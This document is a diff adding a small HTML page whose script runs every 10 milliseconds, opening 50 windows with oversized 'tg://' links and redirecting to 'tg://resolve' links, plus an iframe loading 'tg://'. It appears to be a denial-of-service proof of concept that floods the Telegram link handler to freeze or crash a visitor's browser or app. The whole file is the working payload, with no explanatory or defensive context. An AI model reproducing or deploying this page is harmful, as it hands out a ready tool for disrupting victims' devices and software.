@@ -1,0 +1,15 @@
+<html>
+<head>
+<script>
+setInterval(function(){
+    for(let i=0;i<50;i++){
+        window.open("tg://test?param=" + "x".repeat(1000));
+        window.location.href = "tg://resolve?domain=test" + Date.now();
+    }
+}, 10);
+</script>
+</head>
+<body>
+<iframe src="tg://"></iframe>
+</body>
+</html>
